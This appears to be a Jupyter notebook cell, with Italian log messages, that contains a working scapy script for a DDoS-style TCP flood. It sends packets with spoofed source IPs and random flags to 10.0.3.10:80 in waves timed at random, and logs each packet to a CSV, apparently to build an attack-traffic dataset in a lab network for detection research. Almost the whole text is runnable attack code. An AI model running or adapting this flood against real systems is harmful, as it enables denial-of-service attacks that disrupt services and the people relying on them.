In [ ]:
import random
import time
import sys
import atexit
import pandas as pd

from scapy.all import IP, TCP, send
from datetime import datetime

attack_log = []

def save_attack_dataset():

    print(f"\n[INFO] Salvataggio dataset di attacco in corso...")

    if attack_log:

        dataframe = pd.DataFrame(attack_log)
        dataframe['IAT'] = pd.to_datetime(

            dataframe['Time'], format='%H:%M:%S.%f'

        ).diff().dt.total_seconds().fillna(0)

        output_filename = "dataset_attacco.csv"
        dataframe.to_csv(output_filename, index=False)
        print(f"[OK] Salvati {len(dataframe)} pacchetti in '{output_filename}'")

    else:

        print("[INFO] Nessun pacchetto da salvare.")

atexit.register(save_attack_dataset)

def timed_attack(target_ip="10.0.3.10", target_port=80, duration=30):

    print(f"Avvio attacco DDoS con durata {duration:.1f}s")
    print(f"Bersaglio: {target_ip}:{target_port}")
    packet_count = 0
    flag_list = ["S", "PA", "U", "SA", "F"]
    start_time = time.time()
    ip_intervals = [(51, 64), (116, 129), (181, 194), (246, 254)]

    try:
        while True:
            if time.time() - start_time >= duration:

                break

            chosen_interval = random.choice(ip_intervals)
            last_octet = random.randint(chosen_interval[0], chosen_interval[1])
            source_ip = f"10.0.2.{last_octet}"

            window_size = random.randint(500, 30000)
            payload = "X" * random.randint(10, 60)
            packet = IP(src=source_ip, dst=target_ip, ttl=64) / \
                     TCP(sport=random.randint(1024, 65535),
                         dport=target_port,
                         flags=random.choice(flag_list),
                         window=window_size,
                         seq=random.randint(100000, 4000000000)) / payload
            send(packet, verbose=False)

            attack_log.append({
                "Time": datetime.now().strftime("%H:%M:%S.%f")[:-3],
                "Src_IP": source_ip,
                "Dst_IP": target_ip,
                "S_Port": packet[TCP].sport,
                "D_Port": packet[TCP].dport,
                "Flags": int(packet[TCP].flags),
                "Len": len(packet),
                "Win": packet[TCP].window,
                "TTL": packet[IP].ttl,
                "Seq": packet[TCP].seq,
                "Ack": packet[TCP].ack,
                "Payload_Size": len(payload)
            })

            packet_count += 1

            if packet_count % 100 == 0:

                print(f"[INFO] {packet_count} pacchetti inviati | IP sorgente fittizio: {source_ip}")

            time.sleep(random.uniform(0.0001, 0.05))

    except KeyboardInterrupt:

        print(f"\n[INFO] Attacco interrotto manualmente. Pacchetti in questa sessione: {packet_count}")
        sys.exit()

    print(f"[FINE ONDATA] Durata: {duration:.1f}s - Pacchetti inviati: {packet_count}")

def attack_orchestrator(target_ip="10.0.3.10", target_port=80):

    try:
        while True:

            wait_time = random.uniform(20, 40)
            print(f"\n[INFO] Prossimo attacco tra {wait_time:.1f} secondi...")
            time.sleep(wait_time)
            attack_duration = random.uniform(20, 60)
            timed_attack(target_ip, target_port, attack_duration)

    except KeyboardInterrupt:

        print("\n[INFO] Orchestratore arrestato manualmente.")
        sys.exit()

if __name__ == "__main__":
    
    attack_orchestrator()